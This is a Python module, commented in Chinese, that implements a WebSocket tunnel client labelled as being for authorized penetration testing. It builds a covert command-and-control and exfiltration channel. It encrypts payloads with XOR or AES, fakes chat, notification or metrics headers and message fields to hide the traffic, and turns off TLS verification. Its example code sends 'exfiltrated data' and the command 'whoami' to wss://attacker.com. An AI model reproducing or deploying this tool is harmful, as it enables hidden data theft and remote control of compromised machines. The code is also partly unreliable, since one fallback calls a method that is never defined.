#!/usr/bin/env python3
"""
WebSocket 隧道 - WebSocket Tunnel
功能: 双向全双工数据传输、伪装成正常WS应用、加密通信
特性: WSS加密、心跳保活、断线重连、流量混淆
仅用于授权渗透测试
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import secrets
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, Optional

logger = logging.getLogger(__name__)

# WebSocket 库
try:
    import websockets
    from websockets.client import WebSocketClientProtocol

    HAS_WEBSOCKETS = True
except ImportError:
    HAS_WEBSOCKETS = False
    logger.warning("websockets library not installed. Run: pip install websockets")

try:
    import ssl

    HAS_SSL = True
except ImportError:
    HAS_SSL = False


class EncryptionType(Enum):
    """加密类型"""

    NONE = "none"
    XOR = "xor"
    AES = "aes"


class MessageType(Enum):
    """消息类型"""

    DATA = "data"
    HEARTBEAT = "heartbeat"
    ACK = "ack"
    COMMAND = "command"
    RESPONSE = "response"


@dataclass
class WebSocketMessage:
    """WebSocket 消息"""

    msg_type: MessageType
    payload: str
    msg_id: str = field(
        default_factory=lambda: hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    )
    timestamp: float = field(default_factory=time.time)


@dataclass
class WebSocketConfig:
    """WebSocket 配置"""

    # 连接参数
    url: str = "ws://127.0.0.1:8765"
    encryption_type: EncryptionType = EncryptionType.XOR
    encryption_key: Optional[str] = None

    # 心跳参数
    heartbeat_interval: int = 30  # 秒
    heartbeat_timeout: int = 90  # 秒

    # 重连参数
    max_reconnect_attempts: int = 5
    reconnect_delay: int = 5  # 秒

    # 伪装参数
    disguise_as: str = "chat"  # chat, notifications, metrics
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # 分块传输
    chunk_size: int = 4096  # bytes

    # SSL/TLS
    ssl_verify: bool = False
    ssl_cert_path: Optional[str] = None


class WebSocketTunnel:
    """
    WebSocket 隧道客户端

    功能:
    - WSS 加密连接
    - 数据加密 (XOR/AES)
    - 心跳保活
    - 断线自动重连
    - 伪装成正常应用
    - 分块传输大文件

    Usage:
        config = WebSocketConfig(
            url="wss://attacker.com:8765/chat",
            encryption_key="my_secret_key"
        )
        tunnel = WebSocketTunnel(config)
        await tunnel.connect()
        await tunnel.send_data(b"secret data")
        data = await tunnel.receive_data()
        await tunnel.close()

    异步上下文管理器:
        async with WebSocketTunnel(config) as tunnel:
            await tunnel.send_data(b"data")
    """

    def __init__(self, config: WebSocketConfig):
        self.config = config
        self._websocket: Optional[WebSocketClientProtocol] = None
        self._connected = False
        self._running = False

        # 心跳任务
        self._heartbeat_task: Optional[asyncio.Task] = None
        self._last_heartbeat = time.time()

        # 重连
        self._reconnect_attempts = 0

        # 消息队列
        self._send_queue: asyncio.Queue = asyncio.Queue()
        self._recv_queue: asyncio.Queue = asyncio.Queue()

        # 伪装数据
        self._disguise_headers = self._build_disguise_headers()

    def _build_disguise_headers(self) -> Dict[str, str]:
        """构建伪装 HTTP 头"""
        headers = {
            "User-Agent": self.config.user_agent,
        }

        if self.config.disguise_as == "chat":
            headers.update(
                {
                    "Origin": "https://chat.example.com",
                    "Referer": "https://chat.example.com/room/general",
                }
            )
        elif self.config.disguise_as == "notifications":
            headers.update(
                {
                    "Origin": "https://notifications.example.com",
                    "X-Notification-Client": "web",
                }
            )
        elif self.config.disguise_as == "metrics":
            headers.update(
                {
                    "Origin": "https://metrics.example.com",
                    "X-Metrics-Version": "2.0",
                }
            )

        return headers

    def _encrypt(self, data: bytes) -> bytes:
        """加密数据"""
        if self.config.encryption_type == EncryptionType.NONE:
            return data

        if self.config.encryption_type == EncryptionType.XOR:
            if not self.config.encryption_key:
                return data

            key = self.config.encryption_key.encode()
            encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
            return encrypted

        elif self.config.encryption_type == EncryptionType.AES:
            # AES-256-CBC 加密
            try:
                from Crypto.Cipher import AES
                from Crypto.Util.Padding import pad

                key = hashlib.sha256(self.config.encryption_key.encode()).digest()
                iv = os.urandom(16)
                cipher = AES.new(key, AES.MODE_CBC, iv)
                encrypted = cipher.encrypt(pad(data, AES.block_size))
                return iv + encrypted  # IV + Ciphertext

            except ImportError:
                logger.warning("pycryptodome not installed, falling back to XOR")
                return self._encrypt_xor(data)

        return data

    def _decrypt(self, data: bytes) -> bytes:
        """解密数据"""
        if self.config.encryption_type == EncryptionType.NONE:
            return data

        if self.config.encryption_type == EncryptionType.XOR:
            # XOR 是对称的
            return self._encrypt(data)

        elif self.config.encryption_type == EncryptionType.AES:
            try:
                from Crypto.Cipher import AES
                from Crypto.Util.Padding import unpad

                key = hashlib.sha256(self.config.encryption_key.encode()).digest()
                iv = data[:16]
                ciphertext = data[16:]
                cipher = AES.new(key, AES.MODE_CBC, iv)
                decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
                return decrypted

            except ImportError:
                return self._encrypt(data)  # XOR fallback

        return data

    def _encode_message(self, msg: WebSocketMessage) -> str:
        """编码消息为 JSON"""
        msg_dict = {
            "type": msg.msg_type.value,
            "payload": base64.b64encode(self._encrypt(msg.payload.encode())).decode(),
            "msg_id": msg.msg_id,
            "timestamp": msg.timestamp,
        }

        # 伪装数据 (混淆流量特征)
        if self.config.disguise_as == "chat":
            msg_dict["user"] = f"user_{secrets.randbelow(9000) + 1000}"
            msg_dict["room"] = "general"
        elif self.config.disguise_as == "notifications":
            msg_dict["notification_type"] = "update"
            msg_dict["priority"] = secrets.choice(["low", "normal", "high"])

        return json.dumps(msg_dict)

    def _decode_message(self, raw_data: str) -> Optional[WebSocketMessage]:
        """解码 JSON 消息"""
        try:
            msg_dict = json.loads(raw_data)
            encrypted_payload = base64.b64decode(msg_dict["payload"])
            decrypted = self._decrypt(encrypted_payload)

            return WebSocketMessage(
                msg_type=MessageType(msg_dict["type"]),
                payload=decrypted.decode(),
                msg_id=msg_dict.get("msg_id", ""),
                timestamp=msg_dict.get("timestamp", time.time()),
            )
        except Exception as e:
            logger.error(f"Failed to decode message: {e}")
            return None

    async def connect(self) -> bool:
        """连接到 WebSocket 服务器"""
        if not HAS_WEBSOCKETS:
            logger.error("websockets library not installed")
            return False

        try:
            # SSL 上下文
            ssl_context = None
            if self.config.url.startswith("wss://") and HAS_SSL:
                ssl_context = ssl.create_default_context()
                if not self.config.ssl_verify:
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE

                if self.config.ssl_cert_path:
                    ssl_context.load_cert_chain(self.config.ssl_cert_path)

            # 连接
            self._websocket = await websockets.connect(
                self.config.url,
                extra_headers=self._disguise_headers,
                ssl=ssl_context,
                ping_interval=None,  # 我们自己管理心跳
            )

            self._connected = True
            self._running = True
            self._reconnect_attempts = 0
            self._last_heartbeat = time.time()

            # 启动心跳任务
            self._heartbeat_task = asyncio.create_task(self._heartbeat_loop())

            logger.info(f"WebSocket connected: {self.config.url}")
            return True

        except Exception as e:
            logger.error(f"WebSocket connection failed: {e}")
            self._connected = False
            return False

    async def _heartbeat_loop(self):
        """心跳循环"""
        while self._running and self._connected:
            try:
                # 发送心跳
                heartbeat_msg = WebSocketMessage(msg_type=MessageType.HEARTBEAT, payload="ping")
                await self._websocket.send(self._encode_message(heartbeat_msg))
                self._last_heartbeat = time.time()

                # 检查心跳超时
                if time.time() - self._last_heartbeat > self.config.heartbeat_timeout:
                    logger.warning("Heartbeat timeout, reconnecting...")
                    await self._reconnect()

                await asyncio.sleep(self.config.heartbeat_interval)

            except Exception as e:
                logger.debug(f"Heartbeat error: {e}")
                await asyncio.sleep(5)

    async def _reconnect(self):
        """断线重连"""
        if self._reconnect_attempts >= self.config.max_reconnect_attempts:
            logger.error("Max reconnect attempts reached")
            self._running = False
            return

        self._reconnect_attempts += 1
        logger.info(f"Reconnecting... (attempt {self._reconnect_attempts})")

        await self.close(reconnecting=True)
        await asyncio.sleep(self.config.reconnect_delay)

        success = await self.connect()
        if success:
            logger.info("Reconnection successful")
        else:
            await self._reconnect()

    async def send_data(self, data: bytes) -> bool:
        """
        发送数据

        Args:
            data: 要发送的二进制数据

        Returns:
            bool: 发送是否成功
        """
        if not self._connected or not self._websocket:
            logger.error("WebSocket not connected")
            return False

        try:
            # 分块发送大数据
            chunks = [
                data[i : i + self.config.chunk_size]
                for i in range(0, len(data), self.config.chunk_size)
            ]

            total_chunks = len(chunks)

            for i, chunk in enumerate(chunks):
                msg = WebSocketMessage(
                    msg_type=MessageType.DATA,
                    payload=f"{i}/{total_chunks}:" + base64.b64encode(chunk).decode(),
                )

                await self._websocket.send(self._encode_message(msg))

                # 避免发送过快
                if i < total_chunks - 1:
                    await asyncio.sleep(0.01)

            logger.debug(f"Sent {len(data)} bytes in {total_chunks} chunks")
            return True

        except Exception as e:
            logger.error(f"Send data failed: {e}")
            if not self._websocket.open:
                await self._reconnect()
            return False

    async def receive_data(self, timeout: float = 30.0) -> Optional[bytes]:
        """
        接收数据

        Args:
            timeout: 超时时间 (秒)

        Returns:
            bytes: 接收到的数据，超时或失败返回 None
        """
        if not self._connected or not self._websocket:
            logger.error("WebSocket not connected")
            return None

        try:
            # 接收数据块
            chunks_dict = {}
            total_chunks = None
            start_time = time.time()

            while time.time() - start_time < timeout:
                try:
                    raw_data = await asyncio.wait_for(
                        self._websocket.recv(),
                        timeout=min(5.0, timeout - (time.time() - start_time)),
                    )

                    msg = self._decode_message(raw_data)
                    if not msg:
                        continue

                    # 处理心跳
                    if msg.msg_type == MessageType.HEARTBEAT:
                        self._last_heartbeat = time.time()
                        continue

                    # 处理数据
                    if msg.msg_type == MessageType.DATA:
                        # 解析分块信息
                        if ":" in msg.payload:
                            chunk_info, chunk_data = msg.payload.split(":", 1)
                            chunk_idx, total = map(int, chunk_info.split("/"))

                            chunks_dict[chunk_idx] = base64.b64decode(chunk_data)
                            total_chunks = total

                            # 检查是否接收完所有分块
                            if len(chunks_dict) == total_chunks:
                                # 重组数据
                                full_data = b"".join([chunks_dict[i] for i in range(total_chunks)])
                                logger.debug(
                                    f"Received {len(full_data)} bytes in {total_chunks} chunks"
                                )
                                return full_data

                except asyncio.TimeoutError:
                    continue

            logger.warning("Receive data timeout")
            return None

        except Exception as e:
            logger.error(f"Receive data failed: {e}")
            if not self._websocket.open:
                await self._reconnect()
            return None

    async def send_command(self, command: str) -> Optional[str]:
        """
        发送命令并等待响应

        Args:
            command: 命令字符串

        Returns:
            str: 响应内容
        """
        if not self._connected:
            return None

        try:
            msg = WebSocketMessage(msg_type=MessageType.COMMAND, payload=command)

            await self._websocket.send(self._encode_message(msg))

            # 等待响应
            response_data = await self.receive_data(timeout=30.0)
            return response_data.decode() if response_data else None

        except Exception as e:
            logger.error(f"Send command failed: {e}")
            return None

    async def close(self, reconnecting: bool = False):
        """
        关闭连接

        Args:
            reconnecting: 是否为重连关闭
        """
        if not reconnecting:
            self._running = False

        self._connected = False

        # 取消心跳任务
        if self._heartbeat_task and not self._heartbeat_task.done():
            self._heartbeat_task.cancel()
            try:
                await self._heartbeat_task
            except asyncio.CancelledError:
                pass

        # 关闭 WebSocket
        if self._websocket and self._websocket.open:
            await self._websocket.close()

        if not reconnecting:
            logger.info("WebSocket tunnel closed")

    async def __aenter__(self):
        """异步上下文管理器 - 进入"""
        await self.connect()
        return self

    async def __aexit__(self, exc_type, _exc_val, _exc_tb):
        """异步上下文管理器 - 退出"""
        await self.close()


# 便捷函数
async def create_websocket_tunnel(
    url: str, encryption_key: Optional[str] = None, disguise_as: str = "chat"
) -> WebSocketTunnel:
    """
    创建并连接 WebSocket 隧道

    Args:
        url: WebSocket URL (ws:// 或 wss://)
        encryption_key: 加密密钥
        disguise_as: 伪装类型 (chat, notifications, metrics)

    Returns:
        WebSocketTunnel: 已连接的隧道实例
    """
    config = WebSocketConfig(url=url, encryption_key=encryption_key, disguise_as=disguise_as)

    tunnel = WebSocketTunnel(config)
    await tunnel.connect()
    return tunnel


# 示例用法
async def example_client():
    """示例: WebSocket 隧道客户端"""
    config = WebSocketConfig(
        url="wss://attacker.com:8765/chat",
        encryption_key="my_secret_key_2024",
        disguise_as="chat",
        heartbeat_interval=30,
    )

    async with WebSocketTunnel(config) as tunnel:
        # 发送数据
        await tunnel.send_data(b"Secret exfiltrated data")

        # 接收命令
        command = await tunnel.receive_data()
        if command:
            print(f"Received command: {command}")

        # 双向通信
        await tunnel.send_command("whoami")


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
    logger.info("WebSocket Tunnel Module")
    logger.info("=" * 50)
    logger.info(f"websockets available: {HAS_WEBSOCKETS}")
    logger.info(f"SSL available: {HAS_SSL}")
    logger.warning("[!] This module is for authorized penetration testing only!")
    logger.info("Features:")
    logger.info("  - WSS encrypted connections")
    logger.info("  - XOR/AES data encryption")
    logger.info("  - Heartbeat keepalive")
    logger.info("  - Auto reconnect on failure")
    logger.info("  - Traffic disguise (chat/notifications/metrics)")
    logger.info("  - Chunked data transfer")
    logger.info("Usage:")
    logger.info("  config = WebSocketConfig(url='wss://attacker.com:8765', encryption_key='key')")
    logger.info("  tunnel = WebSocketTunnel(config)")
    logger.info("  await tunnel.connect()")
    logger.info("  await tunnel.send_data(b'data')")
    logger.info("  data = await tunnel.receive_data()")
